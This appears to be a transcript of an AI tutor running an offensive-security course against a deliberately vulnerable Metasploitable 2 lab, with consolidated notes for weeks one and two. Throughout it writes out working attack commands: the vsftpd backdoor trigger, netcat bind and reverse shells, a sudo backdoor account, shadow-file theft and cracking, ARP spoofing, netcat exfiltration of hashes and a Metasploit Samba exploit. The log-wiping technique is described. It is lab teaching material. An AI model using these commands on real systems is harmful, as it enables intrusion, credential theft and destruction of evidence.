# Learning
Networking
Good work. Let me review these deliverables and address the SUID issue, then we'll compile everything.

---

## ✅ Day 7 Bonus Review

**1) SSH fix working.** The legacy algorithm flags resolved the connection perfectly. You now have persistent SSH access as `backdoor`. This is your stable entry point going forward.

**2) `/root/.rhosts` contents: `+ +`**

This is a classic Unix backdoor. The format is `hostname username`. The wildcard `+ +` means:

> "Any user from any host can log in as this user (root) without a password using rlogin."

The `rlogin` (remote login) protocol was used before SSH existed. It trusts the IP address of the connecting host. This is trivially exploitable—an attacker spoofs their IP and logs in as root with no authentication.

**Why this matters:** Someone deliberately placed this backdoor. In a real investigation, this is a critical IOC (Indicator of Compromise).

**3) `reset_logs.sh` analysis:**

This is a log-wiping script. Let me translate what it does:

| Section | Command | What It Destroys |
|:--|:--|:--|
| Stop logging | `/etc/init.d/sysklogd stop` | Stops the system logger so no new entries are written |
| Clear system logs | Loops through `auth.log`, `syslog`, `messages`, etc. | Deletes login records, system events, kernel messages |
| Stop Samba | `/etc/init.d/samba stop` | Stops file sharing service |
| Clear Samba logs | `rm -f /var/log/samba/*` | Deletes file access records |
| Clear DHCP logs | `rm -f /var/lib/dhcp3/*` | Deletes IP lease history |
| Clear service logs | Clears ProFTPD, PostgreSQL, Apache logs | Removes web, database, and FTP access records |

**After running this script, there would be almost no forensic evidence left of any intrusion.**

This is what real attackers deploy. They call them "log cleaners" or "anti-forensics tools." In a professional red team engagement, you might run something like this during cleanup—but only with explicit client permission. Destroying logs without permission is illegal even with a signed ROE.

**4) SUID command issue:** You ran the command and got no output. But I can see you used `sudo`—which means you weren't running it inside the root shell on Metasploitable. The command needs to be executed **on the victim machine**, not on Kali.

Let's fix that. Connect to your Metasploitable shell (either method) and run it there:

---

### 🔧 Correction: Run SUID Scan on Metasploitable

**Option A: Via the root shell (port 6200)**
```bash
nc 10.0.2.3 6200
find / -type f -perm -4000 -exec ls -la {} \; 2>/dev/null
```

**Option B: Via SSH as backdoor, then switch to root**
```bash
ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa backdoor@10.0.2.3
su root
# (root password is probably not set; try just pressing Enter, or use 'sudo su')
find / -type f -perm -4000 -exec ls -la {} \; 2>/dev/null
```

Run this and note how many SUID binaries exist. These are your future privilege escalation vectors. Any binary owned by root with the SUID bit set (`-rwsr-xr-x`) can potentially be exploited to gain root access from a non-root user.

---

### 📖 LESSON 7.9: WHY SUID MATTERS

A normal user runs `passwd` to change their password. But `/etc/shadow` is only writable by root. How does this work?

```
$ ls -la /usr/bin/passwd
-rwsr-xr-x 1 root root 59976 Feb  6  2024 /usr/bin/passwd
```

The `s` in `rws` is the **SUID bit**. It means: "Run this program as the file's owner (root), not as the user who launched it."

This is powerful. If an attacker finds a SUID binary that allows arbitrary command execution, they can run commands as root. Common vulnerable SUID binaries include: `find`, `vim`, `bash`, `less`, `more`, `nmap` (old versions), `cp`, `mv`.

We'll exploit these in the Privilege Escalation phase (Days 31+). The scan is reconnaissance for that.

---

## 📝 CONSOLIDATED COURSE NOTES: WEEK 1 (DAYS 1-7)

---

### ═══════════════════════════════════
### WEEK 1: FOUNDATIONS & INITIAL ACCESS
### ═══════════════════════════════════

---

## DAY 1 — Lab Setup & Foundation

### Concepts
- **CIA Triad:** Confidentiality (see), Integrity (change), Availability (access)
- **VirtualBox networking:** NAT Network or Host-Only for isolated lab
- **Manual pages:** `man [command]` for documentation

### Lab Architecture
```
Kali Linux (Attacker) ←→ Metasploitable 2 (Victim)
     10.0.2.15                   10.0.2.3
```

### Commands
```bash
man ping                    # Read manual
ping -c 4 10.0.2.3         # Limit packets to 4
sudo netdiscover -r 10.0.2.0/24  # Find hosts on network
```

### Key Takeaway
Built the entire lab from scratch. Fixed VirtualBox NAT Network missing, boot order, and .vmdk attachment issues. These troubleshooting skills are the real job.

---

## DAY 2 — Linux Survival I

### Concepts
- Terminal navigation replaces mouse
- Linux file permissions: Read (4), Write (2), Execute (1)
- `..` = parent directory, `.` = current directory

### Commands
```bash
pwd                        # Print Working Directory
ls -la                     # List all with details
cd /etc ~ ..               # Navigate filesystem
mkdir folder               # Create directory
echo "text" > file         # Write (overwrite)
cat file                   # Read file
rm file                    # Delete (permanent)
chmod 600 file             # Owner rw, group none, others none
```

### Permission Number Cheat Sheet
| Number | Permission | Meaning |
|:--|:--|:--|
| 7 | rwx | Full control |
| 6 | rw- | Read and write |
| 5 | r-x | Read and execute |
| 4 | r-- | Read only |
| 0 | --- | No access |

### Key Takeaway
The terminal is your weapon. Permissions are the gatekeepers.

---

## DAY 3 — Pipes, Grep, Redirection

### Concepts
- Pipe (`|`) connects commands: output of one becomes input of another
- `>` overwrites files, `>>` appends
- `grep` filters by pattern
- `cut` extracts fields from structured text

### Commands
```bash
command | grep pattern        # Filter output
command > file.txt            # Save output (overwrite)
command >> file.txt           # Append output
grep -v pattern               # Invert match
grep -i pattern               # Case insensitive
cut -d: -f1                   # Delimiter + field number
ls -la /etc | wc -l           # Count lines
echo "Scan: $(date)" >> file  # Dynamic timestamp
```

### Key Takeaway
Complex operations are simple commands chained with pipes. Never manually copy output—redirect it.

---

## DAY 4 — TCP Handshake & Wireshark

### Concepts
- **Three-Way Handshake:** SYN → SYN-ACK → ACK
- **Open port:** SYN-ACK response. Service listening.
- **Closed port:** RST response. No service.
- **Filtered port:** No response. Firewall blocking.
- **Ports:** 80=HTTP, 22=SSH, 21=FTP, 443=HTTPS, 23=Telnet

### Commands
```bash
nc 10.0.2.3 80              # Connect to port manually
sudo wireshark               # Packet capture GUI
cat /etc/services | grep ssh # Find well-known ports
```

### Wireshark Filter
```
host 10.0.2.3
```

### Key Takeaway
Nmap works by automating handshake probes. You understand the packet-level reality beneath every scan result.

---

## DAY 5 — Nmap Scanning

### Concepts
- Nmap automates TCP handshake probes across ports
- `-sS` (SYN stealth), `-sT` (TCP connect), `-sU` (UDP)
- `-sV` grabs service banners (versions)
- `-O` guesses operating system
- NSE (Nmap Scripting Engine) for vulnerability automation

### Commands
```bash
nmap 10.0.2.3                    # Top 1000 ports
nmap -p- 10.0.2.3                # All 65535 ports
nmap -sV 10.0.2.3                # Version detection
nmap -sS -sV -O 10.0.2.3        # SYN + Version + OS
nmap --script=vuln 10.0.2.3      # Vulnerability scripts
```

### Metasploitable Service Map (30 open ports)
| Port | Service | Version | Risk |
|:--|:--|:--|:--|
| 21 | FTP | vsftpd 2.3.4 | CRITICAL - Backdoored |
| 22 | SSH | OpenSSH 4.7p1 | Old, multiple vulns |
| 23 | Telnet | Linux telnetd | Cleartext creds |
| 80 | HTTP | Apache 2.2.8 | Old, DAV enabled |
| 445 | SMB | Samba 3.X | Multiple RCE vulns |
| 1524 | Bindshell | Root shell | CRITICAL - No exploit needed |
| 3306 | MySQL | 5.0.51a | Database access |
| 6667 | IRC | UnrealIRCd | Potential backdoor |
| 8180 | HTTP | Apache Tomcat | Java app server |

### In the Wild
Phones (Android/iOS) show zero open ports—client devices don't run listening services. Servers vary by role. Printers and IoT devices are notoriously insecure.

### Key Takeaway
Nmap is the universal first step. You have a complete target inventory.

---

## DAY 6 — HTTP Enumeration

### Concepts
- HTTP can be spoken manually (netcat/curl)
- `gobuster` brute-forces directories from wordlists
- `whatweb` fingerprints web technologies
- Server headers leak software versions
- Error messages are reconnaissance data

### Commands
```bash
nc 10.0.2.3 80                 # Raw HTTP request
GET / HTTP/1.1                 # (type this into netcat)
Host: 10.0.2.3

curl http://10.0.2.3            # HTTP GET
curl -I http://10.0.2.3         # Headers only
gobuster dir -u URL -w wordlist # Directory enumeration
whatweb http://10.0.2.3         # Tech fingerprinting
```

### Discovered Web Paths
| Path | What It Is |
|:--|:--|
| `/dav/` | WebDAV file access |
| `/phpMyAdmin/` | MySQL admin panel |
| `/twiki/` | TWiki application (vulnerable) |
| `/mutillidae/` | Deliberately vulnerable web app |
| `/test/` | Test directory |
| `phpinfo.php` | PHP configuration leak |

### Server Stack
- Apache 2.2.8 (2008)
- PHP 5.2.4 (2007)
- Ubuntu 8.04 base

### In the Wild
WordPress sites show `/wp-admin/`. Corporate portals show `/owa/` (Outlook). APIs show `/api/`, `/graphql/`. Dev environments show `/dev/`, `/staging/`, `/backup/`.

### Key Takeaway
The web layer is where most real-world attacks begin. Directories, headers, and error messages are free intelligence.

---

## DAY 7 — First Exploit: vsftpd 2.3.4 Backdoor

### The Vulnerability
- **CVE:** CVE-2011-2523
- **Affected:** vsftpd 2.3.4 (downloaded June 30 - July 1, 2011)
- **Severity:** Critical (9.8/10)
- **Mechanism:** Smiley face `:)` in username triggers root shell on port 6200

### Exploitation (Manual, No Metasploit)
```bash
# Terminal 1: Trigger backdoor
nc 10.0.2.3 21
USER user:)
PASS irrelevant

# Terminal 2: Collect shell
nc 10.0.2.3 6200
whoami
# Output: root
```

### Post-Exploitation Commands
```bash
python -c 'import pty; pty.spawn("/bin/bash")'  # Upgrade shell
cat /etc/shadow                                   # Password hashes
cat /etc/passwd | grep -v nologin                 # Login-capable users
find / -type f -perm -4000 2>/dev/null            # SUID binaries
```

### Persistence Created
```bash
useradd -m -s /bin/bash backdoor
echo "backdoor:Password123" | chpasswd
usermod -aG sudo backdoor
```

### SSH to Metasploitable (Legacy Algorithm Fix)
```bash
ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa backdoor@10.0.2.3
```

### Discovered Backdoors on Victim
- `/root/.rhosts`: `+ +` (rlogin backdoor—any host, any user)
- `/root/reset_logs.sh`: Anti-forensics script that wipes system logs
- `/root/.bash_history → /dev/null`: Root command history deleted

### The Kill Chain Completed
| Phase | Action |
|:--|:--|
| Reconnaissance | Nmap scan, service enumeration |
| Weaponization | Identified vsftpd 2.3.4 |
| Delivery | `:)` in USER field |
| Exploitation | Port 6200 root shell opened |
| Installation | `backdoor` user created |
| C2 | Netcat shell established |
| Actions on Objective | Password hashes extracted, filesystem explored |

### In the Wild
Attackers scan entire IP ranges for vsftpd 2.3.4. Automated exploitation follows within seconds. IoT botnets use this for mass compromise. Once root, attackers steal credentials and pivot to internal networks.

### Key Takeaway
A single vulnerable service grants complete system control. Persistence mechanisms ensure return access. Anti-forensics tools remove evidence.

---

## 🔴 KILL CHAIN STATUS: END OF WEEK 1

```
[████████████████████░░░░░░░░░░░░░░░░░░] 40%

✅ Reconnaissance     — Network & application mapping complete
✅ Initial Access      — Root shell achieved (vsftpd backdoor)
✅ Persistence        — backdoor user created, SSH access working
⬜ Privilege Escalation — Already root, but need unprivileged-to-root paths
⬜ Credential Access  — msfadmin hash extracted, cracking pending
⬜ Lateral Movement   — No additional targets yet
⬜ Exfiltration       — Not yet covered
⬜ Cleanup            — reset_logs.sh identified, not yet executed
```

---

## 🗓️ WEEK 2 PREVIEW

| Day | Topic | What You'll Do |
|:--|:--|:--|
| **8** | Bindshell on Port 1524 | Connect to the root shell that's already listening. No exploit needed. |
| **9** | Password Cracking | Crack msfadmin's hash with John the Ripper. Learn hash types. |
| **10** | Telnet & Credential Sniffing | Watch cleartext credentials fly across the network. |
| **11** | Samba SMB Exploitation | Exploit Samba 3.X for remote code execution. |
| **12** | Web Application Attacks I | SQL Injection on Mutillidae. |
| **13** | Web Application Attacks II | Command Injection and File Inclusion. |
| **14** | Week 2 Review & Consolidation | Practice all exploits. Write your own attack playbook. |

---

**Your Week 1 notes are complete. Save this document.**

Now confirm: can you run the SUID scan **on Metasploitable** and report the count? Then we proceed to Day 8.


📝 CONSOLIDATED COURSE NOTES: WEEK 2 (DAYS 8-11)
═══════════════════════════════════
WEEK 2: EXPLOITATION TECHNIQUES
═══════════════════════════════════
DAY 8 — BINDSHELL & BACKDOOR CREATION
Concepts
Bindshell: Victim listens on a port. Attacker connects to it. Firewall-unfriendly.

Reverse shell: Victim connects back to attacker. Firewall-friendly.

Metasploitable has multiple intentional backdoors for training purposes.

Access Methods Used
bash
nc 10.0.2.3 1524        # Pre-installed root bindshell via xinetd
whoami                   # root
Creating a Temporary Backdoor
bash
nc -lvp 7777 -e /bin/bash &   # On victim: listen and serve shell
nc 10.0.2.3 7777               # From attacker: connect
kill [PID]                     # Clean up
System Investigation Commands
bash
netstat -tulpn                     # All listening ports and processes
ps aux | grep nc                   # Find netcat processes
fuser -k 7777/tcp                  # Kill process on specific port
cat /proc/[PID]/cmdline | tr '\0' ' '  # Exact launch command
Key Discoveries
Port 1524: xinetd bindshell (root access, no trigger needed)

Port 4444: Python mystery listener (likely Metasploit payload)

Port 8787: Ruby HTTP/0.9 service

Port 2121: Second FTP server (ProFTPD)

Port 3632: DistCC daemon (known RCE vulnerability)

Key Takeaway
Multiple backdoors provide redundancy. Internal enumeration (netstat) finds services external scans miss. Kill backdoors after use.

DAY 9 — PASSWORD CRACKING
Concepts
Hashing ≠ Encryption: Hashes are one-way. Cracking = guessing + comparing.

Salt: Random value added before hashing. Prevents rainbow table attacks.

Hash algorithms: $1$ = MD5 (weak), $6$ = SHA512 (strong), $y$ = yescrypt (modern)

Hash Format Breakdown
text
$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/
 └┬┘ └──┬──┘ └──────────┬──────────┘
  │     Salt            Hash
MD5 crypt
Cracking with John the Ripper
bash
echo 'msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/' > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt --rules hash.txt
john --show hash.txt
Hash Verification (Python)
bash
python3 -c "from passlib.hash import md5_crypt; print(md5_crypt.hash('msfadmin', salt='XN10Zj2c'))"
File Transfer via Netcat
bash
# Receiver (Kali)
nc -lvnp 4444 > receivedfile

# Sender (Metasploitable)
nc 10.0.2.15 4444 < all_hashes.txt
Key Findings
msfadmin password: msfadmin (default credential, verified cryptographically)

Root password hash also uses $1$ MD5 (weak)

Only one UID 0 account (root) — no hidden superusers

msfadmin has full sudo access: (ALL) ALL

Key Takeaway
Try default credentials before cracking. Verify hashes with Python before running John. Password reuse is the most common privilege escalation vector. Netcat transfers files across networks without FTP.

DAY 10 — TELNET & CREDENTIAL SNIFFING
Concepts
Telnet (port 23): No encryption. Every character visible in packet capture.

SSH (port 22): Fully encrypted. TCP stream shows gibberish.

ARP Spoofing: Man-in-the-Middle attack that poisons ARP caches.

ARP Spoofing Attack
bash
sudo sysctl net.ipv4.ip_forward=1                    # Enable routing
sudo arpspoof -i eth0 -t 10.0.2.3 10.0.2.2          # Poison victim
sudo arpspoof -i eth0 -t 10.0.2.2 10.0.2.3          # Poison gateway
sudo tcpdump -i eth0 port 23 -w capture.pcap          # Capture traffic
sudo tcpdump -r capture.pcap -A | grep login          # Extract credentials
Wireshark Credential Capture
text
Filter: host 10.0.2.3 and port 23
Right-click → Follow → TCP Stream
Result: metasploitable login: msfadmin
        Password: msfadmin
Protocol Comparison
Protocol	Port	Traffic Readable?
Telnet	23	✅ Yes — Cleartext
HTTP	80	✅ Yes — Cleartext
FTP	21	✅ Yes — Cleartext
SSH	22	❌ No — Encrypted
HTTPS	443	❌ No — Encrypted
Key Takeaway
Never use Telnet in production. ARP spoofing works on switched networks. SSH always encrypts traffic. If you can read credentials in a packet capture, the protocol is insecure.

DAY 11 — SAMBA SMB EXPLOITATION
Concepts
Samba: Linux implementation of Windows SMB protocol (ports 139/445)

CVE-2007-2447: Username map script command injection in Samba 3.0.x

Anonymous shares: World-readable/writable shares without authentication

Samba Enumeration
bash
smbclient -L //10.0.2.3 -N          # List shares (anonymous)
smbclient //10.0.2.3/tmp -N         # Connect to share
enum4linux 10.0.2.3                  # Comprehensive enumeration
Metasploit Exploitation
bash
msfconsole
search samba usermap
use exploit/multi/samba/usermap_script
set RHOSTS 10.0.2.3
set LHOST 10.0.2.15
set PAYLOAD cmd/unix/reverse_netcat
exploit
Payload Types
Payload Type	Direction	Use Case
bind_*	Attacker → Victim	Victim accepts inbound connections
reverse_*	Victim → Attacker	Victim behind firewall/NAT
adduser	N/A	Persistence, not just a shell
Key Findings
Samba 3.0.20-Debian is vulnerable to CVE-2007-2447

tmp share is anonymously accessible with write permission

opt share contains installed software (potential malware staging)

enum4linux reveals domain information and usernames

Key Takeaway
SMB attacks are the backbone of enterprise network compromise. Anonymous shares are data exfiltration points. Metasploit is a force multiplier—understand the vulnerability, then use the framework.

🔴 KILL CHAIN STATUS: END OF WEEK 2
text
[████████████████████████████████░░░░░░░░] 60%

✅ Reconnaissance      — Complete service and directory map
✅ Initial Access       — 6 different root access methods
✅ Persistence         — SSH backdoor user, multiple shells
✅ Credential Access   — Password hashes extracted, msfadmin cracked
⬜ Privilege Escalation — Already root via multiple paths, but no unprivileged escalation yet
⬜ Lateral Movement     — No additional targets yet
⬜ Web App Attacks      — Mutillidae, phpMyAdmin, DVWA identified but not attacked
⬜ Exfiltration        — Netcat file transfer tested, not fully exploited
🗓️ WEEK 3 PREVIEW
Day	Topic	What You'll Do
12	Web App Attacks I — SQL Injection	Break into Mutillidae's database using SQL injection
13	Web App Attacks II — Command Injection & XSS	Execute system commands through web forms
14	Web App Attacks III — File Inclusion	Read system files and execute code via LFI/RFI
15	UnrealIRCd Backdoor	Exploit the IRC daemon backdoor (port 6667)
16	MySQL & PostgreSQL	Database access, credential extraction, UDF escalation
17	VNC Attack	Crack or bypass VNC authentication
18	Week 3 Review & Attack Playbook	Document all 10+ access methods
Your Week 2 notes are complete. Save this document.

You've moved from reconnaissance to exploitation. Six different root access methods. Command-line comfort is becoming second nature. Next week, you attack the web layer.

Ready for Day 12? Confirm and we proceed to SQL Injection.
